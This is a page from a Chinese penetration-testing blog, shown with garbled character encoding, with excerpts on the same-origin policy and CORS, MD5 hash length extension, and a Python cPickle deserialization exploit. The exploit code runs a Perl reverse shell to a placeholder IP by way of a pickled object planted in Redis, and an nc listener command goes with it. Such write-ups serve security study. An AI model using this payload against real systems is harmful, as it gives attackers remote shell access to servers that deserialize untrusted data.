<li>Access-Control-Allow-Originï¼šé™åˆ¶è¿™ä¸ªè¯·æ±‚èƒ½ä»å“ªäº›URIè®¿é—®ã€‚</li>
</ul>
<blockquote>
<p>åœ¨ä½¿ç”¨è¿™ä¸ªè¯·æ±‚ï¼Œä½¿ç”¨AJAXæ—¶ï¼Œè¢«è°ƒç”¨æ–¹éœ€è¦è¾“å‡ºè¿™ä¸ªå¤´ï¼ŒæŒ‡åå¯ä»¥ä»å“ªä¸ªç½‘ç«™ è®¿é—®ï¼Œå¦‚æœæœªè¾“å‡ºè¿™ä¸ªå¤´ï¼Œåªå…è®¸åŒåŸŸåçš„è®¿é—®ã€‚</p>
</blockquote>
<ul>
<li>Access-Control-Allow-Credentials: å…è®¸è¿™ä¸ªè¯·æ±‚ä½¿ç”¨cookieã€‚</li>
</ul>
<blockquote>
<p>ä¸€èˆ¬è·¨åŸŸæƒ…å†µä¸‹ï¼ŒAJAXä¸ä¼šé™„å¸¦ç”¨æˆ·çš„Cookieï¼Œä¹Ÿä¸å…è®¸è®¾ç½®ç”¨æˆ·çš„Cookieï¼Œè¦ä½¿ç”¨è¿™ä¸ªçš„è¯ï¼Œé¦–å…ˆCåœ¨æ„é€ è¿™ä¸ªXMLHTTPRequestå¯¹è±¡æ—¶ï¼Œéœ€è¦è®¾ç½®withCredentialså±æ€§ã€‚</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">XMLHttpRequest:

var xhr &#x3D; new XMLHttpRequest();
xhr.open(&#39;GET&#39;, url, true);
xhr.withCredentials &#x3D; true;
xhr.onreadystatechange &#x3D; handler;
xhr.send()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	

	</div>
  <a type="button" href="/2016/08/29/csrf.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<h2 id="åŒæºç­–ç•¥"><a href="#åŒæºç­–ç•¥" class="headerlink" title="åŒæºç­–ç•¥"></a>åŒæºç­–ç•¥</h2><p>åŒæºç­–ç•¥(Same Origin policy, SOP)ï¼Œä¹Ÿç§°ä¸ºå•æºç­–ç•¥(Single Origin policy)ï¼Œç”¨äºWebæµè§ˆå™¨ç¼–ç¨‹è¯­è¨€çš„å®‰å…¨æªæ–½ï¼Œç”¨ä»¥ä¿æŠ¤ä¿¡æ¯çš„ä¿å¯†æ€§å’Œå®‰å…¨æ€§ã€‚åŒæºç­–ç•¥é˜²æ­¢ç½‘ç«™è„šæœ¬è®¿é—®å…¶ä»–ç«™ç‚¹ä½¿ç”¨è„šæœ¬ï¼Œä¹Ÿç»„ç»‡å®ƒä¸å…¶ä»–ç«™ç‚¹äº¤äº’ã€‚<br>åªè¦<strong>åè®®</strong>ã€<strong>ç«¯å£</strong>ã€<strong>ä¸»æœº</strong>ä¸‰ä¸ªæœ‰ä¸€ä¸ªä¸åŒ¹é…ï¼Œå°±æ˜¯è·¨åŸŸè¯·æ±‚ã€‚</p>
<p>å¦‚æœè¦è·¨åŸŸè¯·æ±‚ï¼Œæœ‰ä¸‹é¢çš„é™åˆ¶ï¼š</p>
<ul>
<li>ä»…å…è®¸GETã€HEADã€POSTè¯·æ±‚</li>
<li>ä»…å…è®¸æ‰‹åŠ¨è®¾ç½®Acceptã€Accept-Languageã€Content-Languageå’ŒContent-Typeå¤´</li>
<li>Content-Typeå¤´ä»…å…è®¸ä½¿ç”¨application/x-www-form-urlencoded,multipart/form-dataå’Œtext/plainè¿™ä¸‰ç§å€¼ã€‚</li>
</ul>
<p>æ»¡è¶³ä»¥ä¸Šä¸‰ä¸ªè¯·æ±‚çš„ï¼Œç§°ä¸ºsimple request<br>å½“ä¸Šé—¨çš„simple requestä¸èƒ½æ»¡è¶³ä½¿ç”¨åœºæ™¯çš„æ—¶å€™ï¼Œæœ‰ä»¥ä¸‹çš„è¯·æ±‚è§£å†³è·¨åŸŸé™åˆ¶ï¼Œéƒ½æ˜¯ä»¥<code>Access-Control-</code>å¼€å¤´ï¼Œæ¯”è¾ƒé‡è¦çš„æœ‰ï¼š</p>
<ul>
<li>Access-Control-Allow-Originï¼šé™åˆ¶è¿™ä¸ªè¯·æ±‚èƒ½ä»å“ªäº›URIè®¿é—®ã€‚</li>
</ul>
<blockquote>
<p>åœ¨ä½¿ç”¨è¿™ä¸ªè¯·æ±‚ï¼Œä½¿ç”¨AJAXæ—¶ï¼Œè¢«è°ƒç”¨æ–¹éœ€è¦è¾“å‡ºè¿™ä¸ªå¤´ï¼ŒæŒ‡åå¯ä»¥ä»å“ªä¸ªç½‘ç«™ è®¿é—®ï¼Œå¦‚æœæœªè¾“å‡ºè¿™ä¸ªå¤´ï¼Œåªå…è®¸åŒåŸŸåçš„è®¿é—®ã€‚</p>
</blockquote>
<ul>
<li>Access-Control-Allow-Credentials: å…è®¸è¿™ä¸ªè¯·æ±‚ä½¿ç”¨cookieã€‚</li>
</ul>
<blockquote>
<p>ä¸€èˆ¬è·¨åŸŸæƒ…å†µä¸‹ï¼ŒAJAXä¸ä¼šé™„å¸¦ç”¨æˆ·çš„Cookieï¼Œä¹Ÿä¸å…è®¸è®¾ç½®ç”¨æˆ·çš„Cookieï¼Œè¦ä½¿ç”¨è¿™ä¸ªçš„è¯ï¼Œé¦–å…ˆCåœ¨æ„é€ è¿™ä¸ªXMLHTTPRequestå¯¹è±¡æ—¶ï¼Œéœ€è¦è®¾ç½®withCredentialså±æ€§ã€‚</p>
</blockquote>
<pre class="line-numbers language-none"><code class="language-none">XMLHttpRequest:

var xhr &#x3D; new XMLHttpRequest();
xhr.open(&#39;GET&#39;, url, true);
xhr.withCredentials &#x3D; true;
xhr.onreadystatechange &#x3D; handler;
xhr.send()<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
	
	</div>
  <a type="button" href="/2016/08/29/csrf.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/07/26/python-cpickle-shell.html" >Python cPickle ååºåˆ—åŒ–shell</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-07-26  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<p>åˆ©ç”¨Python cPickleååºåˆ—åŒ–åå¼¹shellï¼Œä¸»è¦åˆ©ç”¨cPicleçš„<code>__reduce__</code>ï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™è‡ªåŠ¨æ‰§è¡Œï¼Œå®˜æ–¹æ–‡æ¡£æœ‰å¦‚ä¸‹ï¼š</p>
<blockquote>
<p>When a tuple is returned, it must be between two and five elements long. Optional elements can either be omitted, or None can be provided as their value. The contents of this tuple are pickled as normal and used to reconstruct the object at unpickling time. The semantics of each element are:</p>
</blockquote>
<p>   A callable object that will be called to create the initial version of the object. The next element of the tuple will provide arguments for this callable, and later elements provide additional state information that will subsequently be used to fully reconstruct the pickled data.</p>
<p> <code>__reduce__</code>çš„è¿”å›å€¼ï¼Œç¬¬ä¸€ä¸ªä½œä¸º<code>callable object</code>ï¼Œç¬¬äºŒä¸ªä½œä¸ºå‚æ•°è°ƒç”¨ï¼Œæ‰€ä»¥å¯ä»¥æœ‰å¦‚ä¸‹åå¼¹shellçš„æ–¹æ³•:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
import cPickle
import os
import redis

class exp(object):
    def __reduce__(self):
        s &#x3D; &quot;&quot;&quot; perl -e &#39;use Socket;$i&#x3D;&quot;xx.xx.xx.xx&quot;;$p&#x3D;443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;bash -i&quot;);&#125;&#39;&quot;&quot;&quot;
        return (os.system, (s,))
   
e &#x3D; exp()
s &#x3D; cPickle.dumps(e)

r &#x3D; redis.Redis(host&#x3D;&#39;xxx.xxx.xxx.xxx&#39;, port&#x3D;6379, db&#x3D;0)
r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ‰§è¡Œä¹‹åï¼Œå‘ç›®æ ‡IPå†™å…¥keyä¸ºb026324c6904b2a9cb4b88d6d61c81d1ï¼Œå…¶å€¼æ˜¯åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œ__reduce__å‡½æ•°å¯ä»¥åå¼¹shellçš„sessionã€‚<br>åå¼¹shellæŒ‡å®šç«¯å£ <code>nc -l -vv -p 443</code><br>ç„¶ååˆ°redisé¡µé¢è®¾ç½®session_idï¼Œåˆ·æ–°ä¹‹åå³å¯åå¼¹ã€‚</p>

	

	</div>
  <a type="button" href="/2016/07/26/python-cpickle-shell.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<p>åˆ©ç”¨Python cPickleååºåˆ—åŒ–åå¼¹shellï¼Œä¸»è¦åˆ©ç”¨cPicleçš„<code>__reduce__</code>ï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™è‡ªåŠ¨æ‰§è¡Œï¼Œå®˜æ–¹æ–‡æ¡£æœ‰å¦‚ä¸‹ï¼š</p>
<blockquote>
<p>When a tuple is returned, it must be between two and five elements long. Optional elements can either be omitted, or None can be provided as their value. The contents of this tuple are pickled as normal and used to reconstruct the object at unpickling time. The semantics of each element are:</p>
</blockquote>
<p>   A callable object that will be called to create the initial version of the object. The next element of the tuple will provide arguments for this callable, and later elements provide additional state information that will subsequently be used to fully reconstruct the pickled data.</p>
<p> <code>__reduce__</code>çš„è¿”å›å€¼ï¼Œç¬¬ä¸€ä¸ªä½œä¸º<code>callable object</code>ï¼Œç¬¬äºŒä¸ªä½œä¸ºå‚æ•°è°ƒç”¨ï¼Œæ‰€ä»¥å¯ä»¥æœ‰å¦‚ä¸‹åå¼¹shellçš„æ–¹æ³•:</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></li>
</ul>
<pre class="line-numbers language-none"><code class="language-none">#!&#x2F;usr&#x2F;bin&#x2F;env python
import cPickle
import os
import redis

class exp(object):
    def __reduce__(self):
        s &#x3D; &quot;&quot;&quot; perl -e &#39;use Socket;$i&#x3D;&quot;xx.xx.xx.xx&quot;;$p&#x3D;443;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,&quot;&gt;&amp;S&quot;);open(STDOUT,&quot;&gt;&amp;S&quot;);open(STDERR,&quot;&gt;&amp;S&quot;);exec(&quot;&#x2F;bin&#x2F;bash -i&quot;);&#125;&#39;&quot;&quot;&quot;
        return (os.system, (s,))
   
e &#x3D; exp()
s &#x3D; cPickle.dumps(e)

r &#x3D; redis.Redis(host&#x3D;&#39;xxx.xxx.xxx.xxx&#39;, port&#x3D;6379, db&#x3D;0)
r.set(&#39;b026324c6904b2a9cb4b88d6d61c81d1&#39;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>æ‰§è¡Œä¹‹åï¼Œå‘ç›®æ ‡IPå†™å…¥keyä¸ºb026324c6904b2a9cb4b88d6d61c81d1ï¼Œå…¶å€¼æ˜¯åºåˆ—åŒ–çš„å­—ç¬¦ä¸²ï¼Œ__reduce__å‡½æ•°å¯ä»¥åå¼¹shellçš„sessionã€‚<br>åå¼¹shellæŒ‡å®šç«¯å£ <code>nc -l -vv -p 443</code><br>ç„¶ååˆ°redisé¡µé¢è®¾ç½®session_idï¼Œåˆ·æ–°ä¹‹åå³å¯åå¼¹ã€‚</p>

	
	</div>
  <a type="button" href="/2016/07/26/python-cpickle-shell.html#more" class="btn btn-default more">Read More</a>
</div>

		
			
	
	<!-- display as entry -->
<div class="row">
	<div class="col-md-8">
		<h3 class="title">
			<a href="/2016/07/25/hash-length-attack.html" >MD5å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»</a>
		</h3>
		</div>
	<div class="col-md-4">
		<div class="date">post @ 2016-07-25  </div>
		</div>
	</div>
	


			<!--
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></p>
</blockquote>
<p>è¿™ç¯‡æ–‡ç« é‡Œæœ‰æåˆ°çš„å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»çœ‹äº†ä¸‹åšä¸ªç¬”è®°ã€‚ç†è§£å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»ä»¥md5ä¸ºä¾‹ï¼Œéœ€è¦ç†è§£ä¸‹é¢å‡ ç‚¹ï¼š</p>
<h3 id="MD5çš„éƒ¨åˆ†å·¥ä½œåŸç†"><a href="#MD5çš„éƒ¨åˆ†å·¥ä½œåŸç†" class="headerlink" title="MD5çš„éƒ¨åˆ†å·¥ä½œåŸç†"></a>MD5çš„<strong>éƒ¨åˆ†å·¥ä½œåŸç†</strong></h3><h4 id="ä¸€-å…ˆçœ‹ä¸‹MD5çš„è®¡ç®—è¿‡ç¨‹ï¼Œåªéœ€è¦ç†è§£ä¸€åŠï¼š"><a href="#ä¸€-å…ˆçœ‹ä¸‹MD5çš„è®¡ç®—è¿‡ç¨‹ï¼Œåªéœ€è¦ç†è§£ä¸€åŠï¼š" class="headerlink" title="ä¸€. å…ˆçœ‹ä¸‹MD5çš„è®¡ç®—è¿‡ç¨‹ï¼Œåªéœ€è¦ç†è§£ä¸€åŠï¼š"></a>ä¸€. å…ˆçœ‹ä¸‹MD5çš„è®¡ç®—è¿‡ç¨‹ï¼Œåªéœ€è¦ç†è§£ä¸€åŠï¼š</h4><p> å¯¹äºä¸€ä¸ªmessageè¿›è¡Œmd5è®¡ç®—çš„è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼š<br> ç»è¿‡ä¸‰ä¸ªæ­¥éª¤ï¼Œè¿™éƒ¨åˆ†å¯ä»¥çœ‹<a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc1321">RFC</a>:</p>
<p> The message is â€œpaddedâ€ (extended) so that its length (in bits) is congruent to 448, modulo 512.<br>   å…ˆè¿›è¡Œè¡¥ä½ï¼Œä½¿å¾—æ•´ä½“é•¿åº¦å¯¹512å–æ¨¡ä¹‹åçš„å€¼ä¸º448ï¼Œlen(message)%512 == 418ï¼Œè®¡ç®—å•ä½æ˜¯bitï¼ˆä½ï¼‰ã€‚</p>
<ol>
<li><p>Append Padding Bits</p>
<p> è¡¥ä½æ˜¯è¿™æ ·çš„ï¼Œå…ˆåœ¨messageåé¢åŠ 0x80æ ‡è¯†ï¼Œç„¶ååŠ æ— é™ä¸ª0ï¼Œä¸€ç›´æ»¡è¶³å¯¹512bitå–æ¨¡ä¹‹åç­‰äº448bitã€‚</p>
</li>
<li><p>Append Length</p>
<p> 512bitå’Œ448ç›¸å·®64bitï¼Œå³8Byteï¼Œè¿™ä¸ª8å­—èŠ‚ç”¨æ¥è¡¨ç¤ºè¡¥ä½ä¹‹å‰messageçš„é•¿åº¦ã€‚</p>
</li>
<li><p>è®¡ç®—æ¶ˆæ¯æ‘˜</p>
<p>æœ‰ä¸€ä¸ªåˆå§‹é“¾å˜é‡ï¼Œç”¨æ¥å‚ä¸ç¬¬ä¸€è½®çš„è¿ç®—ï¼ŒMD5çš„åˆå§‹å˜é‡ä¸ºï¼š<br>A = 0x67452301<br>B = 0xefcdab89<br>C = 0x98badcfe<br>D = 0x10325476</p>
</li>
</ol>
<p> æ•´ä½“æ¥è¯´å°±æ˜¯å…ˆè¡¥ä½ï¼Œç„¶åè¡¥é•¿åº¦ï¼Œè¿™ä¸ªé•¿åº¦å 8Byteï¼Œç”¨æ¥è¡¨ç¤ºè¡¥ä½ä¹‹å‰messageçš„é•¿åº¦ï¼Œç„¶åè®¡ç®—md5ã€‚ç°åœ¨è®°ä½ä¸‹é¢è¿™å¥è¯ï¼š</p>
<blockquote>
<p>æ¯ç»è¿‡ä¸€æ¬¡æ¶ˆæ¯æ‘˜è¦è®¡ç®—ï¼Œä¸Šé¢çš„<strong>é“¾å˜é‡ä¼šè¢«æ–°çš„å€¼è¦†ç›–</strong>ï¼Œæœ€åä¸€è½®ç»è¿‡é«˜ä½ä½äº’æ¢ï¼ˆaabbccdd -&gt; ddccbbaaï¼‰å°±æ˜¯æœ€ç»ˆçš„MD5å€¼ã€‚</p>
</blockquote>
<p>ç°åœ¨æ¥è¿›è¡Œmd5æ‰©å±•é•¿åº¦æ”»å‡»ï¼š<br>æˆ‘è§‰å¾—ç›´æ¥æŠŠè¿™ä¸ªçœ‹å®Œå°±å·®ä¸å¤šäº†ï¼š<a target="_blank" rel="noopener" href="https://github.com/iagox86/hash_extender">https://github.com/iagox86/hash_extender</a></p>
	

	</div>
  <a type="button" href="/2016/07/25/hash-length-attack.html#more" class="btn btn-default more">Read More</a>
</div>

-->
<div class="entry">
  <div class="row">
	
	
		<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html">https://www.leavesongs.com/PENETRATION/zhangyue-python-web-code-execute.html</a></p>
</blockquote>
<p>è¿™ç¯‡æ–‡ç« é‡Œæœ‰æåˆ°çš„å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»çœ‹äº†ä¸‹åšä¸ªç¬”è®°ã€‚ç†è§£å“ˆå¸Œé•¿åº¦æ‰©å±•æ”»å‡»ä»¥md5ä¸ºä¾‹ï¼Œéœ€è¦ç†è§£ä¸‹é¢å‡ ç‚¹ï¼š</p>
<h3 id="MD5çš„éƒ¨åˆ†å·¥ä½œåŸç†"><a href="#MD5çš„éƒ¨åˆ†å·¥ä½œåŸç†" class="headerlink" title="MD5çš„éƒ¨åˆ†å·¥ä½œåŸç†"></a>MD5çš„<strong>éƒ¨åˆ†å·¥ä½œåŸç†</strong></h3><h4 id="ä¸€-å…ˆçœ‹ä¸‹MD5çš„è®¡ç®—è¿‡ç¨‹ï¼Œåªéœ€è¦ç†è§£ä¸€åŠï¼š"><a href="#ä¸€-å…ˆçœ‹ä¸‹MD5çš„è®¡ç®—è¿‡ç¨‹ï¼Œåªéœ€è¦ç†è§£ä¸€åŠï¼š" class="headerlink" title="ä¸€. å…ˆçœ‹ä¸‹MD5çš„è®¡ç®—è¿‡ç¨‹ï¼Œåªéœ€è¦ç†è§£ä¸€åŠï¼š"></a>ä¸€. å…ˆçœ‹ä¸‹MD5çš„è®¡ç®—è¿‡ç¨‹ï¼Œåªéœ€è¦ç†è§£ä¸€åŠï¼š</h4><p> å¯¹äºä¸€ä¸ªmessageè¿›è¡Œmd5è®¡ç®—çš„è¿‡ç¨‹æ˜¯è¿™æ ·çš„ï¼š<br> ç»è¿‡ä¸‰ä¸ªæ­¥éª¤ï¼Œè¿™éƒ¨åˆ†å¯ä»¥çœ‹<a target="_blank" rel="noopener" href="https://tools.ietf.org/html/rfc1321">RFC</a>:</p>
<p> The message is â€œpaddedâ€ (extended) so that its length (in bits) is congruent to 448, modulo 512.<br>   å…ˆè¿›è¡Œè¡¥ä½ï¼Œä½¿å¾—æ•´ä½“é•¿åº¦å¯¹512å–æ¨¡ä¹‹åçš„å€¼ä¸º448ï¼Œlen(message)%512 == 418ï¼Œè®¡ç®—å•ä½æ˜¯bitï¼ˆä½ï¼‰ã€‚</p>
<ol>
<li><p>Append Padding Bits</p>
<p> è¡¥ä½æ˜¯è¿™æ ·çš„ï¼Œå…ˆåœ¨messageåé¢åŠ 0x80æ ‡è¯†ï¼Œç„¶ååŠ æ— é™ä¸ª0ï¼Œä¸€ç›´æ»¡è¶³å¯¹512bitå–æ¨¡ä¹‹åç­‰äº448bitã€‚</p>
</li>
<li><p>Append Length</p>
<p> 512bitå’Œ448ç›¸å·®64bitï¼Œå³8Byteï¼Œè¿™ä¸ª8å­—èŠ‚ç”¨æ¥è¡¨ç¤ºè¡¥ä½ä¹‹å‰messageçš„é•¿åº¦ã€‚</p>
</li>
<li><p>è®¡ç®—æ¶ˆæ¯æ‘˜</p>
<p>æœ‰ä¸€ä¸ªåˆå§‹é“¾å˜é‡ï¼Œç”¨æ¥å‚ä¸ç¬¬ä¸€è½®çš„è¿ç®—ï¼ŒMD5çš„åˆå§‹å˜é‡ä¸ºï¼š<br>A = 0x67452301<br>B = 0xefcdab89<br>C = 0x98badcfe<br>D = 0x10325476</p>
</li>
</ol>
<p> æ•´ä½“æ¥è¯´å°±æ˜¯å…ˆè¡¥ä½ï¼Œç„¶åè¡¥é•¿åº¦ï¼Œè¿™ä¸ªé•¿åº¦å 8Byteï¼Œç”¨æ¥è¡¨ç¤ºè¡¥ä½ä¹‹å‰messageçš„é•¿åº¦ï¼Œç„¶åè®¡ç®—md5ã€‚ç°åœ¨è®°ä½ä¸‹é¢è¿™å¥è¯ï¼š</p>
<blockquote>
<p>æ¯ç»è¿‡ä¸€æ¬¡æ¶ˆæ¯æ‘˜è¦è®¡ç®—ï¼Œä¸Šé¢çš„<strong>é“¾å˜é‡ä¼šè¢«æ–°çš„å€¼è¦†ç›–</strong>ï¼Œæœ€åä¸€è½®ç»è¿‡é«˜ä½ä½äº’æ¢ï¼ˆaabbccdd -&gt; ddccbbaaï¼‰å°±æ˜¯æœ€ç»ˆçš„MD5å€¼ã€‚</p>
</blockquote>
<p>ç°åœ¨æ¥è¿›è¡Œmd5æ‰©å±•é•¿åº¦æ”»å‡»ï¼š<br>æˆ‘è§‰å¾—ç›´æ¥æŠŠè¿™ä¸ªçœ‹å®Œå°±å·®ä¸å¤šäº†ï¼š<a target="_blank" rel="noopener" href="https://github.com/iagox86/hash_extender">https://github.com/iagox86/hash_extender</a></p>
	
	</div>
  <a type="button" href="/2016/07/25/hash-length-attack.html#more" class="btn btn-default more">Read More</a>
</div>

		

		</div>

		<!-- pagination -->
		<div>
  		<center>
		<div class="pagination">

   
    
     <a href="/page/17/" type="button" class="btn btn-default"><i class="fa fa-arrow-circle-o-left"></i> Prev</a>
      

        <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
 
       <a href="/page/19/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
        

  
</div>

  		</center>
		</div>

		
		
	</div> <!-- col-md-9 -->

	
		<div class="col-md-3">
	<div id="sidebar">
	
			
  <div id="site_search">
   <div class="form-group">
    <input type="text" id="local-search-input" name="q" results="0" placeholder="Search" class="st-search-input st-default-search-input form-control"/>
   </div>  
  <div id="local-search-result"></div>
  </div>


		
			
	<div class="widget">
		<h4>Categories</h4>
		<ul class="tag_box inline list-unstyled">
		
			<li><a href="/categories/CTF/">CTF<span>1</span></a></li>
		
			<li><a href="/categories/Fun/">Fun<span>4</span></a></li>
		
			<li><a href="/categories/Java/">Java<span>8</span></a></li>
		
			<li><a href="/categories/Learning/">Learning<span>16</span></a></li>
		
			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
		
			<li><a href="/categories/Pentest/">Pentest<span>50</span></a></li>
		
			<li><a href="/categories/Python/">Python<span>5</span></a></li>
		
			<li><a href="/categories/SQL/">SQL<span>7</span></a></li>
		
			<li><a href="/categories/Tools/">Tools<span>2</span></a></li>
		
		</ul>
	</div>

		
			

		
			
<div class="widget">
  <h4>Recent Posts</h4>
  <ul class="entry list-unstyled">
    
      <li>
        <a href="/2023/03/27/pinfish-and-osx-pentest.html" ><i class="fa fa-file-o"></i>è®°ä¸€æ¬¡é’“é±¼æ¼”ç»ƒå’ŒOS Xä¸‹çš„æ¸—é€æŠ€å·§</a>
      </li>
    
      <li>
        <a href="/2023/03/03/github-trick.html" ><i class="fa fa-file-o"></i>Githubæœç´¢å°æŠ€å·§</a>
      </li>
    
      <li>
        <a href="/2023/02/14/kafka-rce.html" ><i class="fa fa-file-o"></i>Apache Kafka Connect JNDIæ³¨å…¥...</a>
      </li>
    
      <li>
        <a href="/2023/02/13/cname-hijack-openresty.html" ><i class="fa fa-file-o"></i>åˆ©ç”¨OpenRestyè¿›è¡ŒåŸŸåæµé‡åŠ«æŒ</a>
      </li>
    
      <li>
        <a href="/2023/01/16/pay_vuln.html" ><i class="fa fa-file-o"></i>æ”¯ä»˜æ¥å£å®‰å…¨æµ‹è¯•è®°å½•</a>
      </li>
    
  </ul>
</div>

		
	</div> <!-- sidebar -->
</div> <!-- col-md-3 -->

	
	
</div> <!-- row-fluid -->
	</div>
  </div>
  <div class="container-narrow">
  <footer> <p>
  
  &copy; 2023 JKme's Blog
  
      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
</p>
 </footer>
</div> <!-- container-narrow -->
  


  
<a id="gotop" href="#">   
  <span>â¬†ï¸TOP</span>
</a>

<script src="/js/jquery.imagesloaded.min.js"></script>
<script src="/js/gallery.js"></script>
<script src="/js/bootstrap.min.js"></script>
<script src="/js/main.js"></script>
<script src="/js/search.js"></script> 


<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
<script src="/fancybox/jquery.fancybox.pack.js"></script>
<script type="text/javascript">
(function($){
  $('.fancybox').fancybox();
})(jQuery);
</script>



   <script type="text/javascript">      
     var search_path = "search.xml";
	 if (search_path.length == 0) {
	 	search_path = "search.xml";
	 }
	 var path = "/" + search_path;
     searchFunc(path, 'local-search-input', 'local-search-result');
   </script>

</body>
   </html>
